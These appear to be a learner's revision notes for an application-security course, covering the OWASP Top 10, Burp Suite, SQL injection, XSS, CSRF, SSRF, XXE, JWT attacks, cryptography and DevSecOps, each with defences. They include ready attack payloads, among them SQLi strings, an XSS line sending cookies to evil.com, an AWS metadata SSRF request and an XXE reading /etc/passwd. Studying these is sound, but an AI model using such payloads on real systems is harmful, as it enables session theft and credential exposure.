# Revision Notes — Days 5–25 (AppSec Core)

---

# DAY 5 — Web Application Architecture

## The 3-Tier Model
- **Frontend**: HTML/CSS/JS in the browser. User controls this. Never trust it.
- **Backend**: Application logic (Flask, Spring Boot, Node). Where bugs live.
- **Database**: MySQL, PostgreSQL. Where data lives.

## Authentication vs Authorization
- **Authentication** = Who are you? (login)
- **Authorization** = What can you do? (permissions)
- **IDOR** = correct auth, missing authz check on specific resources

## Session Cookie Security Flags
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
HttpOnly   → JS cannot read it (blocks XSS cookie theft)
Secure     → HTTPS only (blocks network interception)
SameSite   → Not sent cross-site (blocks CSRF)
```

---

# DAY 6 — OWASP Top 10 (2021)

| Rank | Name | One-Line | Fix |
|------|------|---------|-----|
| A01 | Broken Access Control | Accessing things you shouldn't | Server-side authz checks on every request |
| A02 | Cryptographic Failures | Weak/missing encryption | HTTPS, bcrypt, AES-256, no MD5 |
| A03 | Injection | User input in interpreter | Parameterized queries, input validation |
| A04 | Insecure Design | Flawed by design | Threat modeling, secure design patterns |
| A05 | Security Misconfiguration | Wrong defaults | Harden configs, security headers, no defaults |
| A06 | Vulnerable Components | Outdated dependencies | Snyk, Dependabot, regular updates |
| A07 | Auth Failures | Broken login/sessions | MFA, rate limiting, secure session management |
| A08 | Software Integrity | Unverified updates | Signature verification, SRI |
| A09 | Logging Failures | Can't detect breaches | Comprehensive logging, SIEM, alerting |
| A10 | SSRF | Server fetches attacker URLs | Whitelist destinations, block internal IPs |

## Memory: "Because Code Is Insecure, Security Vulnerabilities Identify Software Liability Seriously"
(Broken, Crypto, Injection, Insecure Design, Security Misconfig, Vulns, Ident/Auth, Software Integrity, Logging, SSRF)

---

# DAY 7 — Burp Suite

## The Proxy Setup
```
Firefox → FoxyProxy → Burp Suite (127.0.0.1:8080) → Target
```

## Key Tabs
| Tab | What it does | When you use it |
|-----|-------------|----------------|
| **Proxy** | Intercept all traffic | Always on, HTTP history is your log |
| **Repeater** | Manually modify and resend requests | MOST USED — for all manual testing |
| **Intruder** | Automated attacks with payloads | Brute force, fuzzing |
| **Decoder** | Encode/decode base64, URL, hex | JWT, encoded params |
| **Target** | Site map of discovered paths | Scope definition |
| **Comparer** | Diff two responses | Username enumeration |

## The Core Workflow
1. Browse target with Burp proxying
2. Find interesting request in HTTP History
3. Right-click → Send to Repeater
4. Modify request → Send → Observe response
5. Repeat with different payloads
6. Document findings

---

# DAY 8 — SQL Injection

## What It Is
User input inserted directly into SQL query. Input contains SQL syntax that changes the query's behavior.

## Bypass Payload
```sql
' OR '1'='1          -- always true, returns all rows
' OR 1=1--           -- comment out the rest
admin'--             -- comment out password check
```

## UNION Attack
```sql
' UNION SELECT 1,password,3 FROM users--
-- Must match number of columns in original query
```

## 5 Types
1. **Classic** — results visible directly
2. **Error-based** — database errors leak data
3. **UNION** — extract data from other tables
4. **Blind Boolean** — true/false page changes
5. **Blind Time** — SLEEP(5) to confirm

## Prevention
```python
# WRONG
query = f"SELECT * FROM users WHERE name='{user_input}'"

# RIGHT — parameterized
db.execute("SELECT * FROM users WHERE name=?", (user_input,))
```

---

# DAY 9 — XSS (Cross-Site Scripting)

## 3 Types
| Type | Where payload lives | Who gets hit |
|------|--------------------|-----------  |
| **Reflected** | URL or form, echoed in response | Only victims who click the crafted URL |
| **Stored** | Database | Every visitor to the page |
| **DOM-based** | Client-side JS, never touches server | Victims of crafted URL |

## Common Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

## What XSS Enables
- Steal session cookies (if no HttpOnly flag)
- Keylogging in the victim's browser
- Redirect to phishing site
- Account takeover

## Prevention
- Output encoding: `<` → `&lt;` before inserting into HTML
- Content Security Policy (CSP) header
- HttpOnly cookies (block cookie theft)
- React/Vue/Angular auto-escape by default

---

# DAY 10 — Phase 1 Self-Test Answers

1. TCP = reliable, ordered, handshake. UDP = fast, unreliable, no handshake.
2. SSH=22, HTTP=80, HTTPS=443, MySQL=3306, RDP=3389
3. Authentication = who are you. Authorization = what can you do.
4. Reflected = URL, one-time. Stored = database, every visitor.
5. `requests.post("https://httpbin.org/post", data={"username":"admin","password":"test"})`
6. `grep -r "password" /path/ 2>/dev/null`
7. `' OR '1'='1` or `' OR 1=1--`
8. Manually modify and resend a single request.
9. Broken Access Control — users accessing things they shouldn't.
10. Server creates random ID, stores server-side, sends via Set-Cookie. Browser sends cookie on every request. Server looks up ID to identify user.

---

# DAY 11 — Authentication Vulnerabilities

| Vulnerability | What It Means | Fix |
|--------------|--------------|-----|
| Brute force | No rate limiting on login | Rate limit, lockout, MFA |
| Username enumeration | Different errors for unknown user vs wrong password | Same error for both |
| 2FA bypass | MFA code not tied to specific user session | Bind code to session, require both steps atomically |
| Weak password reset | Predictable token, guessable questions | Random token, short expiry, no security questions |
| Default credentials | admin/admin still works | Force change on first login |
| Session fixation | Attacker pre-sets session ID | Generate new session ID after login |

---

# DAY 12 — IDOR / Access Control

## IDOR Test Patterns
- Change `?id=42` to `?id=43` or `?id=1`
- Change `?user_id=YOUR_ID` to another user's ID
- Edit JWT role field from "user" to "admin"
- Modify hidden form fields in Burp

## Horizontal vs Vertical Escalation
- **Horizontal**: User A sees User B's data (same privilege level)
- **Vertical**: Regular user accesses admin functions

## Vulnerable Code Pattern
```python
# WRONG — no ownership check
order = db.execute("SELECT * FROM orders WHERE id=?", (order_id,))

# RIGHT — force ownership
order = db.execute("SELECT * FROM orders WHERE id=? AND user_id=?",
                   (order_id, current_user.id))
```

---

# DAY 13 — CSRF

## How It Works
1. Victim logged into bank.com
2. Victim visits evil.com
3. evil.com auto-submits a form to bank.com/transfer
4. Browser sends session cookie automatically
5. Bank processes it — thinks it's the user

## CSRF Token Defense
- Server generates random token per session
- Embeds in every form as hidden field
- Validates token on submission
- Attacker can't read the token (Same-Origin Policy blocks cross-origin reads)

## SameSite Cookie Fix
```
Set-Cookie: session=abc; SameSite=Strict
```
Browser won't send this cookie on ANY cross-site request.

---

# DAY 14 — SSRF, XXE, File Upload

## SSRF — The Cloud Killer
```
Normal: fetch_url=https://legitimate.com/image.jpg
Attack: fetch_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Returns AWS instance credentials
```
Capital One breach (100M+ records) was this exact attack.

Fix: Whitelist allowed URL destinations. Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x).

## XXE — XML Entity Injection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
Fix: Disable external entity processing in XML parser.

## File Upload
Attack: Upload .php file. Access it via URL. Execute commands.
Fix: Validate file type by magic bytes (not extension). Store outside web root. Rename on upload.

---

# DAY 15 — JWT & API Security

## JWT Structure
```
eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VyIjoiYWRtaW4ifQ  .  signature
       Header                      Payload               Signature
   (algorithm)              (claims — NOT encrypted)   (verify integrity)
```

**Key fact**: Payload is base64 encoded, NOT encrypted. Anyone can decode it.

## JWT Attacks
| Attack | How | Fix |
|--------|-----|-----|
| None algorithm | Set alg:none, remove signature | Reject "none" algorithm |
| Algorithm confusion | RS256→HS256, sign with public key | Whitelist allowed algorithms |
| Weak secret | Brute force HMAC secret with hashcat | Long random secrets (256+ bits) |
| Sensitive data | Decode payload to read secrets | Never put secrets in JWT payload |

## API Security Key Points
- **Mass assignment**: Server accepts `{"role":"admin"}` → whitelist allowed fields
- **Excessive data exposure**: Return only needed fields — filter server-side, not client-side
- **Rate limiting**: Prevent brute force and scraping on every endpoint
- **CORS**: Don't use `Access-Control-Allow-Origin: *` on authenticated endpoints

---

# DAY 16 — Secure Coding

## The 10 Rules
1. Never trust user input — validate format, type, length, range
2. Parameterized queries — never concatenate SQL
3. Encode output — HTML entity encoding prevents XSS
4. bcrypt/argon2 for passwords — never MD5, SHA1, or plaintext
5. HTTPS everywhere — encrypt in transit, add HSTS
6. HttpOnly, Secure, SameSite cookies
7. Principle of least privilege — database user needs only required permissions
8. No stack traces in production — log internally, show generic error to users
9. Keep dependencies updated — Dependabot, Snyk
10. Log security events — failed logins, admin actions, permission changes

---

# DAY 17 — Threat Modeling

## STRIDE Framework
| Letter | Threat | Question | Example |
|--------|--------|---------|---------|
| S | Spoofing | Can someone impersonate? | JWT forgery, phishing |
| T | Tampering | Can someone modify data? | SQL injection, parameter tampering |
| R | Repudiation | Can someone deny actions? | No audit log |
| I | Info Disclosure | Can data leak? | Error messages, IDOR |
| D | Denial of Service | Can someone crash it? | SYN flood, resource exhaustion |
| E | Elevation of Privilege | Can someone gain more access? | Broken access control |

## CVSS Score Ranges
- **9.0–10.0 Critical**: RCE, full data breach, easy to exploit
- **7.0–8.9 High**: Significant impact, moderately easy
- **4.0–6.9 Medium**: Moderate impact or complex exploitation
- **0.1–3.9 Low**: Minor impact, difficult to exploit

## Bug Report Template
```
Title: [VulnType] in [Component]
Severity: Critical/High/Medium/Low
CVSS: X.X

Description: 2 sentences
Steps to Reproduce: numbered
Expected: what should happen
Actual: what does happen
Impact: what attacker gains
Fix: specific recommendation
References: OWASP link
```

---

# DAY 18 — OWASP Juice Shop Project

## Docker Launch
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop
# Open: http://localhost:3000
```

## Easy Challenges (Start Here)
1. Access score board (hidden path — find it in JS)
2. Log in as admin (SQL injection in login)
3. Find the admin panel
4. Reflected XSS on search
5. DOM XSS

## Working Methodology
1. Browse as normal user, map functionality
2. Open Burp, proxy everything
3. For each feature: test the 3 most likely vulns
4. Document every finding in a bug report

---

# DAY 19 — Cryptography

## Algorithm Status

| Algorithm | Type | Status | Notes |
|-----------|------|--------|-------|
| AES-256-GCM | Symmetric | SAFE | Gold standard |
| bcrypt (cost≥12) | Password hash | SAFE | Standard for passwords |
| argon2id | Password hash | SAFE | Best for new apps |
| SHA-256/512 | Hash | SAFE | Not for passwords |
| RSA-2048+ | Asymmetric | SAFE | Key exchange, signatures |
| MD5 | Hash | BROKEN | Collisions, too fast |
| SHA-1 | Hash | BROKEN | SHAttered attack |
| DES | Symmetric | BROKEN | 56-bit, crackable in hours |
| ECB mode | Mode | AVOID | Preserves patterns |
| SHA-256 for passwords | Hash | AVOID | Too fast — use bcrypt |

## Why Passwords Need Slow Hashing
```
MD5 speed:    100,000,000,000 hashes/second on modern GPU
bcrypt(12):             100 hashes/second

After database breach:
MD5 → cracked in minutes
bcrypt → takes years
```

## Symmetric vs Asymmetric
- **Symmetric (AES)**: same key encrypts and decrypts. Fast. Bulk data.
- **Asymmetric (RSA)**: public key encrypts, private key decrypts. Slow. Key exchange.
- **HTTPS**: asymmetric to exchange symmetric key, symmetric for actual data.

---

# DAY 20 — DevSecOps & Secure SDLC

## Security at Each Phase
| Phase | Security Activity |
|-------|------------------|
| Plan | Security requirements, threat modeling |
| Design | Secure architecture review, data flow diagrams |
| Implement | Secure coding, code review, IDE security plugins |
| Test | SAST, DAST, SCA, secret scanning |
| Deploy | Secrets vault, IaC security scanning, least privilege |
| Maintain | CVE monitoring, patch management, incident response |

## Tool Types
- **SAST**: Scans code without running (Semgrep, SonarQube)
- **DAST**: Scans running app (OWASP ZAP, Burp Enterprise)
- **SCA**: Scans dependencies (Snyk, Dependabot)
- **Secret scanning**: Finds creds in code (TruffleHog, GitLeaks)
- **Container scanning**: Docker image vulns (Trivy, Grype)

## GitHub Actions Security Pipeline
```yaml
name: Security Scan
on: [push, pull_request]
jobs:
  semgrep:
    steps:
      - uses: actions/checkout@v4
      - uses: returntocorp/semgrep-action@v1
        with: {config: p/owasp-top-ten}
  secrets:
    steps:
      - uses: actions/checkout@v4
        with: {fetch-depth: 0}
      - uses: trufflesecurity/trufflehog@main
```

## "Shift Left" Principle
Fix bugs in design: 1 hour
Fix in code review: 1 day
Fix in QA: 1 week
Fix in production: months + millions

---

# DAYS 21–25 — Phase 2 Completion

## Day 21 — Advanced PortSwigger Labs
Target topics (pick your weak areas):
- Server-Side Template Injection (SSTI): `{{7*7}}` in template inputs → server executes expression
- HTTP Request Smuggling: exploit discrepancy between frontend/backend interpretation of Content-Length vs Transfer-Encoding
- Path Traversal: `../../etc/passwd` in file path inputs
- Business Logic: functionality-specific bugs (skip payment step, apply coupon multiple times)

## Day 22 — Recon Workflow
```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -d target.com

# 2. HTTP probing (which subdomains are live?)
cat subdomains.txt | httpx -status-code

# 3. Port scanning
nmap -sV -top-ports 1000 target.com

# 4. Directory brute force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# 5. Technology fingerprinting
whatweb https://target.com

# 6. Historical URLs
waybackurls target.com | grep "="  # find old params

# LEGAL: Only test systems you own or have explicit written permission
```

## Day 23 — Mobile Security Quick Reference
| Vulnerability | Description | Fix |
|--------------|-------------|-----|
| Insecure data storage | Passwords in plaintext on device | Encrypted storage (Keychain/Keystore) |
| Insecure communication | HTTP instead of HTTPS | Certificate pinning, HTTPS only |
| Insecure auth | Tokens stored insecurely | Secure storage, short-lived tokens |
| Code tampering | No integrity checks | Code signing, anti-tampering |
| Reverse engineering | No obfuscation | ProGuard/R8, obfuscation tools |

## Day 24 — Bug Hunter's Day (Options)
- **HackerOne**: hackerone.com → find beginner-friendly program → hunt
- **VulnHub**: download a VM, set up in VMware, hack it end-to-end
- **Juice Shop**: aim for 30+ challenges, write full security assessment

## Day 25 — Phase 2 Review Checklist
Can you:
- [ ] Find SQL injection in a vulnerable app
- [ ] Find XSS in a vulnerable app
- [ ] Find IDOR in a vulnerable app
- [ ] Use Burp Suite Repeater fluently
- [ ] Write a professional bug report
- [ ] Set up Semgrep in CI pipeline
- [ ] Explain CSRF and its mitigation
- [ ] Explain JWT vulnerabilities and attacks
- [ ] Implement bcrypt password hashing

**Score 7+**: ready for Phase 3 (Cloud Security — Days 26+)

---

## Quick Reference Card — Days 5–25

```
WEB ARCH:     Frontend(browser) -> Backend(server) -> Database
AUTH vs AUTHZ: Authentication=who, Authorization=what
SESSION:      HttpOnly + Secure + SameSite=Strict

OWASP TOP 3:  A01 Broken Access | A03 Injection | A07 Auth Fail

BURP REPEATER -> most used. Modify and resend individual requests.

SQLi FIX:     parameterized queries ALWAYS
XSS FIX:      output encoding + CSP + HttpOnly cookies
CSRF FIX:     CSRF token OR SameSite=Strict cookie
SSRF FIX:     whitelist URLs, block 169.254.169.254

JWT ATTACKS:  none-alg | alg-confusion | weak-secret
API RISKS:    IDOR | mass-assignment | excessive-exposure

PASSWORDS:    bcrypt or argon2id (NEVER MD5/SHA1/SHA256)
CRYPTO SAFE:  AES-256-GCM | RSA-2048+ | SHA-256 (not passwords)
CRYPTO DEAD:  MD5 | SHA-1 | DES | ECB mode

DEVSECOPS:    SAST(code) + DAST(runtime) + SCA(deps) + secrets
SHIFT LEFT:   fix bugs earlier = exponentially cheaper
```
